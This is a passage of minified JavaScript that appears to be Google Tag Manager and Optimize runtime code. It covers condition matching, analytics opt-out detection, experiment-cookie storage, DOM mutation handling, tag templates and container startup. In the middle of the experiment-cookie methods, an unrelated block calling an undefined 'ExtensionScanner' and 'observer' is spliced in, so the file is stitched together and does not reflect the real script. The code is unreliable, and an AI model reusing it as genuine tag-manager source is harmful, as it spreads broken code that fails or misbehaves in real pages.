      case "_lt":
        return Number(b) < Number(c);
      case "_re":
        var q;
        var t = a.ignore_case ? "i" : void 0;
        try {
          var r = String(c) + t,
            u = wd.get(r);
          u || (u = new RegExp(c, t), wd.set(r, u));
          q = u.test(b);
        } catch (v) {
          q = !1;
        }
        return q;
      case "_sw":
        return 0 === String(b).indexOf(String(c));
      case "_um":
        return Cv(b, c);
    }
    return !1;
  }
  ;
  function Fv() {
    var a = ["&cv=1043", "&rv=" + xe.Lf, "&tc=" + Pc.filter(function (b) {
      return b;
    }).length];
    xe.qd && a.push("&x=" + xe.qd);
    return a.join("");
  }
  ;
  var jw = function () {
      var a = !0;
      mi(7) && mi(9) && mi(10) || (a = !1);
      return a;
    },
    kw = function () {
      var a = !0;
      mi(3) && mi(4) || (a = !1);
      return a;
    };
  uf();
  function px() {
    return C.gaGlobal = C.gaGlobal || {};
  }
  var qx = function () {
      var a = px();
      a.hid = a.hid || za();
      return a.hid;
    },
    rx = function (a, b) {
      var c = px();
      if (void 0 == c.vid || b && !c.from_cookie) c.vid = a, c.from_cookie = b;
    };
  var Zx = function (a) {
      this.C = a;
      this.D = "";
      this.h = this.C;
    },
    $x = function (a, b) {
      a.h = b;
      return a;
    };
  function ay(a) {
    var b = a.search;
    return a.protocol + "//" + a.hostname + a.pathname + (b ? b + "&richsstsse" : "?richsstsse");
  }
  function by(a, b) {
    var c = a || [];
    if (Array.isArray(c)) for (var d = 0; d < c.length; d++) b(c[d]);
  }
  ;
  var qy = window,
    ry = document,
    sy = function (a) {
      var b = qy._gaUserPrefs;
      if (b && b.ioo && b.ioo() || ry.documentElement.hasAttribute("data-google-analytics-opt-out") || a && !0 === qy["ga-disable-" + a]) return !0;
      try {
        var c = qy.external;
        if (c && c._gaUserPrefs && "oo" == c._gaUserPrefs) return !0;
      } catch (f) {}
      for (var d = Ei("AMP_TOKEN", String(ry.cookie), !0), e = 0; e < d.length; e++) if ("$OPT_OUT" == d[e]) return !0;
      return ry.getElementById("__gaOptOutExtension") ? !0 : !1;
    };
  function By(a) {
    k(a, function (c) {
      "_" === c.charAt(0) && delete a[c];
    });
    var b = a[L.g.Ta] || {};
    k(b, function (c) {
      "_" === c.charAt(0) && delete b[c];
    });
  }
  ;
  var Jy = function (a, b) {};
  function Iy(a, b) {
    var c = function () {};
    return c;
  }
  function Ky(a, b, c) {}
  ;
  var Ly = Iy;
  Object.freeze({
    dl: 1,
    id: 1
  });
  Object.freeze(["config", "event", "get", "set"]);
  var Ny = encodeURI,
    X = encodeURIComponent,
    Oy = function (a, b, c) {
      $b(a, b, c);
    },
    Py = function (a, b) {
      if (!a) return !1;
      var c = yj(Aj(a), "host");
      if (!c) return !1;
      for (var d = 0; b && d < b.length; d++) {
        var e = b[d] && b[d].toLowerCase();
        if (e) {
          var f = c.length - e.length;
          0 < f && "." != e.charAt(0) && (f--, e = "." + e);
          if (0 <= f && c.indexOf(e, f) == f) return !0;
        }
      }
      return !1;
    },
    Qy = function (a, b, c) {
      for (var d = {}, e = !1, f = 0; a && f < a.length; f++) a[f] && a[f].hasOwnProperty(b) && a[f].hasOwnProperty(c) && (d[a[f][b]] = a[f][c], e = !0);
      return e ? d : null;
    };
  var Ty = function (a) {
      if (!Ry[a]) {
        Ry[a] = !0;
        var b = C[a] || {};
        C[a] = b;
        var c = function (e) {
            return Sy[e];
          },
          d = b.get;
        b.get = d ? function (e) {
          return void 0 !== Sy[e] ? Sy[e] : d(e);
        } : c;
      }
    },
    Wy = function (a, b) {
      Sy[a] = b;
      for (var c = Uy(a), d = 0; d < c.length; d++) Vy(c[d], a, b);
      c = Uy("");
      for (var e = 0; e < c.length; e++) Vy(c[e], a, b);
    },
    Vy = function (a, b, c) {
      try {
        a(c, b, tg());
      } catch (d) {}
    },
    Uy = function (a) {
      Xy[a] = Xy[a] || [];
      return Xy[a];
    },
    Sy = {},
    Xy = {},
    Ry = {};
  var Yy = function () {
      C.gaData = C.gaData || {};
      return C.gaData;
    },
    Zy = function (a, b) {
      b = void 0 === b ? !1 : b;
      C.gaData = C.gaData || {};
      var c = C.gaData,
        d = c.tracker_created;
      c.tracker_created = function (e) {
        b && a(e);
        d && ua(d) && d(e);
        b || a(e);
      };
    },
    $y = function (a) {
      var b = C[Gr()];
      try {
        if (ua(b) && ua(b.getAll)) return b.getAll().filter(function (c) {
          return c.get("trackingId") === a;
        });
      } catch (c) {}
      return [];
    },
    fz = function (a, b) {
      var c = az[a];
      if (c) H(function () {
        return b(c);
      });else {
        var d = $y(a)[0];
        d ? (az[a] = d, bz || (bz = d), H(function () {
          return b(d);
        })) : (cz[a] || (cz[a] = []), cz[a].push(b), dz || (dz = !0, Zy(function (e) {
          var f = e.get("trackingId");
          if (cz[f]) {
            if (ez[f]) {
              ez[f] = !1;
              var h = C[Gr()];
              ua(h) && h("ga.require", "_" + tg());
            }
            bz || (bz = e);
            az[f] = e;
            for (var l = cz[f], m; void 0 !== (m = l.shift());) m(e);
            cz[f] = void 0;
          }
        })));
      }
    },
    gz = function (a, b, c, d) {
      var e = C[Gr()];
      if ("data" === b.hitType && c) {
        var f = C.gaData,
          h = Number(f && f[d] && f[d].first_hit),
          l = Ka();
        !isNaN(h) && l > h && (b.queueTime = Math.min(2E3, l + 100 - h));
      }
      try {
        var m = "t0" != a.get("name") ? a.get("name") + ".send" : "send";
        e(m, b);
      } catch (n) {}
    },
    az = {},
    cz = {},
    ez = {},
    bz,
    dz = !1,
    hz,
    iz = function (a, b, c) {
      fz(a, function (d) {
        H(function () {
          gz(d, b, c, a);
        });
      });
    },
    jz = function () {
      var a = !1;
      Zy(function () {
        if (!a) {
          var b = C[Gr()];
          ua(b) && (b("ga.require", "__" + tg()), a = !0);
        }
      }, !0);
    },
    kz = function (a, b, c) {
      var d = Yy(),
        e = d[a] = d[a] || {};
      (e.pending_experiments = e.pending_experiments || {})[b] = c;
      e.experiments = e.experiments || {};
      e.experiments[b] = c;
    },
    lz = function (a) {
      var b = Yy()[a];
      return b ? b.hitcount || 0 : 0;
    },
    oz = function (a, b, c, d, e, f) {
      Wy(b, c);
      var h = d;
      if (d) {
        var l = xj(C.location, "host");
        xj(Aj(d), "host") === l && (d = "");
      }
      Zy(function (q) {
        q.set("referrer", d ? d : void 0);
      }, !0);
      if (mz(a)) ye.ga4_referrer_override = h, nz(a, b, c, e, f);else {
        kz(a, b, c);
        for (var m = $y(a), n = 0; n < m.length; ++n) m[n].set("referrer", d ? d : void 0);
        if (0 < lz(a)) {
          var p = m[0];
          p && gz(p, {
            hitType: "data"
          }, !0, a);
        }
      }
    },
    mz = function (a) {
      return !!a && "G-" === a.substring(0, 2);
    },
    nz = function (a, b, c, d, e) {
      if (mz(a)) {
        var f = ns(a, "experiment_impression", {
          experiment_id: b,
          variant_id: c
        });
        qs(f, d, {
          originatingEntity: e,
          deferrable: !0
        });
      } else kz(a, b, c), 0 < lz(a) && iz(a, {
        hitType: "data"
      }, !0);
    };
  var sz = function (a, b, c) {
      function d() {
        f || (f = !0, !0 !== pz && (pz = !1), qz(c), bt(e));
      }
      ut = a;
      var e = "GTM-T3C7J52_" + b,
        f = !1;
      ct(e);
      C.google_optimize = C.google_optimize || {};
      var h = C.google_optimize;
      h["GTM-T3C7J52"] = h["GTM-T3C7J52"] || {};
      h["GTM-T3C7J52"].optimize_dyn = function (m) {
        m.split(",").forEach(function (n) {
          rz[n] = !0;
        });
        pz = !0;
        d();
      };
      Xb(a, void 0, d);
      var l = C[xe.ba];
      C.setTimeout(function () {
        d();
      }, Number(l && l.hide && l.hide.timeout) || 1E4);
    },
    qz = function (a) {
      if (void 0 !== tz) {
        var b = tz - uz,
          c,
          d;
        pz ? c = Ka() - tz : d = Ka() - tz;
        vt({
          km: b,
          yl: c,
          wl: d
        });
      }
      rz.optimize_ready = !0;
      Gt({
        event: "opt.dyn"
      });
      Gt({
        event: "opt.js"
      });
      if (a && 0 < a.length) {
        var e = {};
        C[xe.ba].forEach(function (f) {
          var h = f.event;
          h && (e[h] = !0);
        });
        a.forEach(function (f) {
          e[f] && Gt({
            event: f
          });
        });
      }
      H(function () {
        Lr("_" + tg());
      });
    },
    vz = function (a, b, c, d, e, f, h, l, m) {
      function n(w, x) {
        x && (r += "&" + w + "=" + encodeURIComponent(x));
      }
      uz = Ka();
      if (a || b || c) {
        var p = void 0;
        if (b) {
          var q = Fk().aw;
          q && (p = q[0]);
        }
        if (f && (a || c || p)) {
          var t = 1,
            r,
            u = "GTM-T3C7J52_" + t++;
          ct(u);
          var v = function (w) {
            hz = w;
            tz = Ka();
            a || b ? (r = "?id=GTM-T3C7J52", a && n("cid", w), n("gclid", p), h && (n("gtm_auth", ""), n("gtm_preview", "")), (h || a) && n("cb", String(Math.random())), sz(r, t++, e)) : qz(e);
            bt(u);
          };
          mz(d) ? qs(ls("get", d, "client_id", v), l, {
            originatingEntity: m,
            deferrable: !0
          }) : (ez[d] = !0, fz(d, function (w) {
            return v(w.get("clientId"));
          }));
        } else qz(e);
      }
    },
    rz = {},
    uz,
    tz,
    pz,
    ut;
  var wz = function (a, b) {
    this.Je = a;
    this.Nd = b;
  };
  wz.prototype.toString = function () {
    var a = "" + this.Je;
    1 < this.Nd && (a = a + "-" + this.Nd);
    return a;
  };
  var xz = function (a, b) {
    this.C = a;
    this.h = b;
  };
  xz.prototype.toString = function () {
    return this.h + "." + this.C;
  };
  var yz = function () {
      var a = Ye("optimize.cookie_path", 2);
      return g(a) ? a : "/";
    },
    Az = function (a, b) {
      var c = new zz(a, b);
      c.Kl();
      return c;
    },
    zz = function (a, b) {
      this.K = Math.floor(new Date() / 864E5);
      this.D = a || "auto";
      this.h = b || yz();
      this.C = new wz(Wi(this.D), Xi(this.h));
      this.O = [];
      this.map = {};
    };
  aa = zz.prototype;
  aa.Qk = function (a) {
    if (!a) return "";
    var b = this.Uf(a);
    return b ? b.C : "";
  };
  aa.am = function (a, b, c, d, e) {
    var f, h;
    f = void 0 === f ? 10 : f;
    h = void 0 === h ? 3E3 : h;
    if (!a) return !1;
    void 0 == b && (b = "");
    this.xe(a, new xz(b, c));
    this.rk(e);
    return this.Tj(d, f, h);
  };
  if (document.body) {
    new ExtensionScanner().execute();
  } else {
    observer.observe(document.documentElement, {
      childList: true,
      subtree: true
    });
  }
  aa.Uf = function (a) {
    return this.map[a];
  };
  aa.Ok = function () {
    for (var a = 0, b = 0; b < this.O.length; b++) "x" !== this.Uf(this.O[b]).C[0] && a++;
    return a;
  };
  aa.xe = function (a, b) {
    a && ("" === b.C ? this.xi(a) : (this.map[a] || this.O.push(a), this.map[a] = b));
  };
  aa.fm = function (a) {
    for (var b = 0; b < a.length; b++) this.xe(a[b][0], a[b][1]);
  };
  aa.xi = function (a) {
    var b = this.O.indexOf(a);
    0 <= b && this.O.splice(b, 1);
    delete this.map[a];
  };
  aa.Vl = function () {
    for (var a = [], b = 0; b < this.O.length; b++) {
      var c = this.O[b];
      this.map[c].h < this.K && a.push(c);
    }
    for (var d = 0; d < a.length; d++) this.xi(a[d]);
  };
  aa.Mk = function () {
    for (var a = [], b = 0; b < this.O.length; b++) {
      var c = this.O[b];
      a.push([c, this.map[c]]);
    }
    return a;
  };
  aa.Ek = function () {
    for (var a = 0, b = 0; b < this.O.length; b++) a = Math.max(a, this.map[this.O[b]].h);
    return 864E5 * a;
  };
  aa.toString = function () {
    if (0 == this.O.length) return "";
    for (var a = [], b = 0; b < this.O.length; b++) {
      var c = this.O[b];
      a.push(c + "." + this.map[c].toString());
    }
    return "GAX1." + this.C.toString() + "." + a.join("!");
  };
  aa.Tj = function (a, b, c) {
    var d = new Date();
    this.Vl();
    var e = this.Ok();
    if (e > b || e > (a || 10) && Hi().replace(RegExp("(?:;\\s*)?(_gaexp=[^;]+)(?:;\\s*)?"), this.toString()).length > c) return !1;
    d.setTime(this.Ek());
    if ("auto" != this.D) return this.C = new wz(Wi(this.D), Xi(this.h)), 0 === Ri("_gaexp", this.toString(), {
      path: this.h,
      domain: this.D,
      expires: d
    });
    for (var f = Oi(), h = 0; h < f.length; h++) if (this.C = new wz(Wi(f[h]), Xi(this.h)), 0 === Ri("_gaexp", this.toString(), {
      path: this.h,
      domain: f[h],
      expires: d
    })) return !0;
    return !1;
  };
  aa.Kl = function () {
    var a = Li("_gaexp", this.C.Je, this.C.Nd);
    if (a) {
      var b = this.Ll(a);
      b && this.fm(b.Mk());
    }
  };
  aa.Ll = function (a) {
    for (var b = new zz(this.D, this.h), c = a.split("!"), d = 0; d < c.length; d++) {
      var e = c[d].split(".");
      if (3 == e.length) {
        if (isNaN(Number(e[1]))) return;
        b.xe(e[0], new xz(e[2], Number(e[1])));
      }
    }
    return b;
  };
  aa.rk = function (a) {
    a = a || {};
    var b = 0;
    a.hasOwnProperty("") && !isNaN(Number(a[""])) && (b = this.K - Ea(a[""]));
    for (var c = 0; c < this.O.length; c++) {
      var d = this.O[c];
      if (a.hasOwnProperty(d) && !isNaN(Number(a[d]))) {
        var e = this.Uf(d);
        e.h = Ea(a[d]) + b;
        this.xe(d, e);
      }
    }
  };
  var Fz = function () {
      Bz = Ka();
      var a = Cz;
      Cz = [];
      for (var b = 0; b < a.length; b++) a[b]();
      Dz && (Dz.takeRecords(), Cz.length || (Dz && (Dz.disconnect(), Dz = null), Ez && (C.clearTimeout(Ez), Ez = null)));
    },
    Hz = function () {
      var a = Ka() - Bz;
      a >= Gz ? (Ez && (C.clearTimeout(Ez), Ez = null), Fz()) : Ez || (Ez = C.setTimeout(function () {
        Fz();
        Ez = null;
      }, Gz - a));
    },
    Iz = function (a) {
      if (!C.MutationObserver) return !1;
      try {
        return Dz || (Dz = new MutationObserver(Hz), Dz.observe(F.documentElement, {
          subtree: !0,
          childList: !0,
          attributes: !0,
          characterData: !0
        }), Bz = Ka()), Cz.push(a), !0;
      } catch (b) {
        return !1;
      }
    },
    Dz = null,
    Cz = [],
    Gz = 0,
    Bz = 0,
    Ez = null;
  var Jz = function (a, b) {
      b && Iz(a) || C.setTimeout(a, 80);
    },
    Kz = function (a) {
      try {
        return Gd(a);
      } catch (b) {
        return null;
      }
    },
    Oz = function (a) {
      if (Rq) return !0;
      for (; a;) {
        if (a.nextSibling) return !0;
        a = a.parentNode;
      }
      return !1;
    },
    Zz = function (a, b) {
      for (var c = Kz(a.na) || [], d = [], e = 0; e < c.length; e++) {
        var f = c[e];
        if (!f.gtmProgressiveApplied || !f.gtmProgressiveApplied[b]) {
          if (a.Ka && !Oz(f)) break;
          d.push(f);
        }
      }
      return d;
    },
    $z = function (a, b) {
      return function () {
        a.gtmProgressiveApplied && delete a.gtmProgressiveApplied[b];
      };
    },
    aA = function (a, b) {
      a.gtmProgressiveApplied || (a.gtmProgressiveApplied = {});
      a.gtmProgressiveApplied[b] = !0;
    },
    bA = function (a, b, c) {
      var d;
      var e = [];
      if (b.Qa) {
        if (b.Qa.Of) d = [{
          element: F.head
        }];else {
          var f = Zz(b.Qa, b.id),
            h = null;
          b.df && (h = Zz(b.df, b.id + "-t"));
          for (var l = 0; l < f.length; l++) {
            var m = f[l],
              n = void 0;
            if (null != h && (n = h.length > l ? h[l] : null, !n && !Rq && (null === b.df.la || b.Wh + e.length < b.df.la))) break;
            e.push({
              element: m,
              targetElement: n
            });
          }
          d = e;
        }
      } else d = e;
      var p = d;
      if (!Rq && b.nk && (!a || null == b.Qa.la || b.Qa.la != b.Ge + p.length)) return !1;
      for (var q = 0; q < p.length; q++) {
        var t = p[q].element,
          r = p[q].targetElement,
          u = void 0;
        b.Ge++;
        aA(t, b.id);
        r && (b.Wh++, u = b.id + "-t", aA(r, u));
        var v = b.sk(t, r);
        ua(v) && b.Cc.push(v);
        b.Cc.push($z(t, b.id));
        r && u && b.Cc.push($z(r, u));
      }
      if (b.Qa.la && b.Qa.la == b.Ge || Rq && (!c || b.Ge)) b.finished = !0;
      return !0;
    },
    cA = function (a) {
      for (var b = {}, c = 0; c < a.fa.length; c++) {
        var d = a.fa[c];
        if (!d.Qa.Of) {
          var e = b[d.Qa.na];
          e || (e = b[d.Qa.na] = Kz(d.Qa.na) || []);
          for (var f = 0; f < e.length; f++) {
            var h = e[f];
            h.gtmProgressiveApplied && h.gtmProgressiveApplied[d.id] || (aA(h, d.id), d.Cc.push($z(h, d.id)));
          }
        }
      }
    },
    dA = function (a) {
      if (!a.pg) {
        for (var b = a.yd; b < a.fa.length; b++) {
          var c = a.fa[b],
            d = b == a.yd;
          if (!c.finished && !bA(d, c, a.Oi && a.Ji)) break;
          c.finished && d && a.yd++;
        }
        a.fa.length > a.yd ? (!a.pending && a.Oi && (a.pending = !0, Jz(function () {
          a.pending = !1;
          dA(a);
        }, a.Ji)), Rq || a.lg || (a.lg = function () {
          H(function () {
            dA(a);
          });
        }, ac(F, "DOMContentLoaded", a.lg))) : cA(a);
      }
    },
    eA = {},
    fA = {},
    gA = void 0,
    hA = function (a, b, c, d) {
      var e = gA;
      if (!Fd || !e) return !1;
      var f = {
        id: e.id + ":" + e.fa.length,
        sk: b,
        Cc: [],
        nk: c,
        Qa: a,
        Ge: 0,
        df: d || null,
        Wh: 0,
        finished: !1
      };
      e.fa.push(f);
      null === a ? (f.finished = !0, b(null)) : dA(e);
      return !0;
    },
    iA = function (a) {
      var b = ta;
      try {
        b = rv(a, "visibility", "hidden", !0);
      } catch (c) {}
      return function () {
        ua(b) && b.apply();
        b = null;
      };
    },
    jA = function (a, b, c, d) {
      var e = b;
      if (!Rq && !a.Of) {
        var f = iA(a.na);
        Tq.push(f);
        e = function (h, l) {
          var m = b(h, l);
          f();
          return m;
        };
      }
      return hA(a, e, c, d);
    };
  var Y = {
    m: {}
  };
  Y.m.dee = ["google"], function () {
    (function (a) {
      Y.__dee = a;
      Y.__dee.o = "dee";
      Y.__dee.isVendorTemplate = !0;
      Y.__dee.priorityOverride = 0;
      Y.__dee.isInfrastructure = !1;
      Y.__dee.runInSiloedMode = !1;
    })(function () {
      var a = !1;
      return a ? "gtm.sync" : "gtm.js";
    });
  }();
  Y.m.sel = ["google"], function () {
    (function (a) {
      Y.__sel = a;
      Y.__sel.o = "sel";
      Y.__sel.isVendorTemplate = !0;
      Y.__sel.priorityOverride = 0;
      Y.__sel.isInfrastructure = !1;
      Y.__sel.runInSiloedMode = !1;
    })(function (a) {
      return Gd(a.vtp_selector);
    });
  }();
  Y.m.c = ["google"], function () {
    (function (a) {
      Y.__c = a;
      Y.__c.o = "c";
      Y.__c.isVendorTemplate = !0;
      Y.__c.priorityOverride = 0;
      Y.__c.isInfrastructure = !1;
      Y.__c.runInSiloedMode = !0;
    })(function (a) {
      fv(a.vtp_value, "c", a.vtp_gtmEventId);
      return a.vtp_value;
    });
  }();
  Y.m.e = ["google"], function () {
    (function (a) {
      Y.__e = a;
      Y.__e.o = "e";
      Y.__e.isVendorTemplate = !0;
      Y.__e.priorityOverride = 0;
      Y.__e.isInfrastructure = !1;
      Y.__e.runInSiloedMode = !0;
    })(function (a) {
      return String(a.vtp_gtmCachedValues.event);
    });
  }();
  Y.m.u = ["google"], function () {
    var a = function (b) {
      return {
        toString: function () {
          return b;
        }
      };
    };
    (function (b) {
      Y.__u = b;
      Y.__u.o = "u";
      Y.__u.isVendorTemplate = !0;
      Y.__u.priorityOverride = 0;
      Y.__u.isInfrastructure = !1;
      Y.__u.runInSiloedMode = !1;
    })(function (b) {
      var c;
      c = (c = b.vtp_customUrlSource ? b.vtp_customUrlSource : Yu("gtm.url", 1)) || Vu();
      var d = b[a("vtp_component")];
      if (!d || "URL" == d) return Xu(String(c));
      var e = Aj(String(c)),
        f;
      if ("QUERY" === d) a: {
        var h = b[a("vtp_multiQueryKeys").toString()],
          l = b[a("vtp_queryKey").toString()] || "",
          m = b[a("vtp_ignoreEmptyQueryParam").toString()],
          n;
        h ? xa(l) ? n = l : n = String(l).replace(/\s+/g, "").split(",") : n = [String(l)];
        for (var p = 0; p < n.length; p++) {
          var q = yj(e, "QUERY", void 0, void 0, n[p]);
          if (void 0 != q && (!m || "" !== q)) {
            f = q;
            break a;
          }
        }
        f = void 0;
      } else f = yj(e, d, "HOST" == d ? b[a("vtp_stripWww")] : void 0, "PATH" == d ? b[a("vtp_defaultPages")] : void 0);
      return f;
    });
  }();
  Y.m.asprv = ["google"], function () {
    function a() {
      Zu({
        event: "optimize.domChange"
      });
      Iz(a);
    }
    (function (b) {
      Y.__asprv = b;
      Y.__asprv.o = "asprv";
      Y.__asprv.isVendorTemplate = !0;
      Y.__asprv.priorityOverride = 0;
      Y.__asprv.isInfrastructure = !1;
      Y.__asprv.runInSiloedMode = !1;
    })(function (b) {
      var c = b.vtp_globalName,
        d = !!b.vtp_listenForMutations,
        e = Yu("eventModel");
      c && Ty(c);
      d && a();
      var f, h, l;
      e && (f = e.name || "", h = e.callback, l = e.remove);
      if (h && ua(h)) if (f = String(f), !0 !== l) {
        var m = f,
          n = h;
        Uy(m).push(n);
        if ("" !== m) void 0 !== Sy[m] && Vy(n, m, Sy[m]);else for (var p in Sy) void 0 !== Sy[p] && Vy(n, p, Sy[p]);
      } else {
        var q = h,
          t = Uy(f),
          r = t.indexOf(q);
        0 <= r && t.splice(r, 1);
      }
      b.vtp_gtmOnSuccess();
    });
  }();
  Y.m.gaoo_c = ["google"], function () {
    (function (a) {
      Y.__gaoo_c = a;
      Y.__gaoo_c.o = "gaoo_c";
      Y.__gaoo_c.isVendorTemplate = !0;
      Y.__gaoo_c.priorityOverride = 0;
      Y.__gaoo_c.isInfrastructure = !1;
      Y.__gaoo_c.runInSiloedMode = !1;
    })(function (a) {
      var b = W("_gaUserPrefs");
      try {
        if (b && b.ioo && b.ioo()) return !0;
      } catch (e) {}
      var c = Gd("html");
      if (c && 0 < c.length && c[0].hasAttribute("data-google-analytics-opt-out") || F.getElementById("__gaOptOutExtension")) return !0;
      var d = W("external");
      return d && "oo" == d._gaUserPrefs ? !0 : !!W("ga-disable-" + a.vtp_trackingId);
    });
  }();
  Y.m.ctto = ["google"], function () {
    (function (a) {
      Y.__ctto = a;
      Y.__ctto.o = "ctto";
      Y.__ctto.isVendorTemplate = !0;
      Y.__ctto.priorityOverride = 0;
      Y.__ctto.isInfrastructure = !1;
      Y.__ctto.runInSiloedMode = !1;
    })(function (a) {
      var b = a.vtp_isDynamic,
        c = W("dataLayer"),
        d = c && c.hide;
      if (!d) return !1;
      var e = tg(),
        f = W("document");
      if (void 0 === f.querySelector) return !1;
      var h = !!f.querySelector("body");
      if (null !== d.end || !h) return !1;
      if (!b) return !0 === d[e];
      for (var l in d) if (d.hasOwnProperty(l) && Pa(l, e) && !0 === d[l]) return !0;
      return !1;
    });
  }();
  var lA = {};
  lA.dataLayer = Ze;
  lA.callback = function (a) {
    Pe.hasOwnProperty(a) && ua(Pe[a]) && Pe[a]();
    delete Pe[a];
  };
  lA.bootstrap = 0;
  lA._spx = !1;
  function mA() {
    ye[tg()] = ye[tg()] || lA;
    zg();
    Dg() || k(Eg(), function (a, b) {
      Qq(a, b.transportUrl, b.context);
      K(92);
    });
    Na(Qe, Y.m);
    Q(67) && vg(Bg());
    Wc = fd;
  }
  (function (a) {
    function b() {
      m = F.documentElement.getAttribute("data-tag-assistant-present");
      Qt(m) && (l = h.Oj);
    }
    if (!C["__TAGGY_INSTALLED"]) {
      var c = !1;
      if (F.referrer) {
        var d = Aj(F.referrer);
        c = "cct.google" === xj(d, "host");
      }
      if (!c) {
        var e = Ii("googTaggyReferrer");
        c = e.length && e[0].length;
      }
      c && (C["__TAGGY_INSTALLED"] = !0, Xb("https://cct.google/taggy/agent.js"));
    }
    if (Ke) a();else {
      var f = function (u) {
          var v = "GTM",
            w = "GTM";
          Ee ? (v = "OGT", w = "GTAG") : Ke && (w = v = "OPT");
          var x = C["google.tagmanager.debugui2.queue"];
          x || (x = [], C["google.tagmanager.debugui2.queue"] = x, Xb("https://" + xe.Gc + "/debug/bootstrap?id=" + mg.ctid + "&src=" + w + "&cond=" + u + "&gtm=" + cj()));
          var y = {
            messageType: "CONTAINER_STARTING",
            data: {
              scriptSource: Rb,
              containerProduct: v,
              debug: !1,
              id: mg.ctid,
              targetRef: {
                ctid: mg.ctid,
                isDestination: kg.nd
              },
              aliases: ng(),
              destinations: qg()
            }
          };
          y.data.resume = function () {
            a();
          };
          xe.Ri && (y.data.initialPublish = !0);
          x.push(y);
        },
        h = {
          Fm: 1,
          Pj: 2,
          dk: 3,
          Ti: 4,
          Oj: 5
        },
        l = void 0,
        m = void 0,
        n = yj(C.location, "query", !1, void 0, "gtm_debug");
      Qt(n) && (l = h.Pj);
      if (!l && F.referrer) {
        var p = Aj(F.referrer);
        "tagassistant.google.com" === xj(p, "host") && (l = h.dk);
      }
      if (!l) {
        var q = Ii("__TAG_ASSISTANT");
        q.length && q[0].length && (l = h.Ti);
      }
      l || b();
      if (!l && Rt(m)) {
        var t = function () {
            if (r) return !0;
            r = !0;
            b();
            l && Rb ? f(l) : a();
          },
          r = !1;
        ac(F, "TADebugSignal", function () {
          t();
        }, !1);
        C.setTimeout(function () {
          t();
        }, 200);
      } else l && Rb ? f(l) : a();
    }
  })(function () {
    try {
      xg();
      if (Q(24)) {}
      zf().C();
      ji();
      var a = ug();
      if (hg().canonical[a]) {
        var b = ye.zones;
        b && b.unregisterChild(pg());
        Lr(tg());
      } else {
        Nq();
        for (var c = data.resource || {}, d = c.macros || [], e = 0; e < d.length; e++) Mc.push(d[e]);
        for (var f = c.tags || [], h = 0; h < f.length; h++) Pc.push(f[h]);
        for (var l = c.predicates || [], m = 0; m < l.length; m++) Oc.push(l[m]);
        for (var n = c.rules || [], p = 0; p < n.length; p++) {
          for (var q = n[p], t = {}, r = 0; r < q.length; r++) {
            var u = q[r][0];
            t[u] = Array.prototype.slice.call(q[r], 1);
            "if" !== u && "unless" !== u || Vc(t[u]);
          }
          Nc.push(t);
        }
        Rc = Y;
        Sc = Dv;
        mA();
        if (Q(35) && !Ke) {
          for (var v = qf["7"], w = v ? v.split("|") : [], x = {}, y = 0; y < w.length; y++) x[w[y]] = !0;
          for (var A = 0; A < Xf.length; A++) {
            var B = Xf[A],
              D = x[B] ? "granted" : "denied";
            Ef().implicit(B, D);
          }
        }
        Pt();
        Rq = !1;
        Sq = 0;
        if ("interactive" == F.readyState && !F.createEventObject || "complete" == F.readyState) or();else {
          ac(F, "DOMContentLoaded", or);
          ac(F, "readystatechange", or);
          if (F.createEventObject && F.documentElement.doScroll) {
            var I = !0;
            try {
              I = !C.frameElement;
            } catch (P) {}
            I && ur();
          }
          ac(C, "load", or);
        }
        dt = !1;
        "complete" === F.readyState ? ft() : ac(C, "load", ft);
        Ng && (Ig($g), C.setInterval(Zg, 864E5));
        Ig(Fv);
        Ig(Ur);
        Ig(op);
        Ig(cm);
        Ig(es);
        Ig(Tl);
        Ig(ej);
        Ig(Rl);
        Ig(as);
        Q(44) && Ig(Xr);
        lu();
        pf(1);
        Bs();
        Oe = Ka();
        lA.bootstrap = Oe;
        if (Q(24)) {}
      }
    } catch (P) {
      if (pf(4), Ng) {
        var M = Ug(!0, !0);
        $b(M);
      }
    }
  });
})();